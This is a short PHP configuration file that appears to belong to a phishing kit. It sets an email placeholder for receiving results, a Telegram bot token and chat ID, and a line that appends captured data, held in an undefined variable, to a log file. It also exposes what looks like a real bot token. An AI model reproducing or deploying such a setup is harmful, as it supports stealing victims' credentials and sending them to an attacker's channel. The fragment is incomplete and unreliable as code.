<?php


$Your_Mail = "YOURMAIL@gmail.com";

$botToken = "8906852417:AAF3P9fAMALuN4EnYe_FHRt9gi3xIcXAyBY";

$chatId = "-1003824729039";


$f = fopen("../../vaa.php", "a");
	fwrite($f, $yagmai);


?>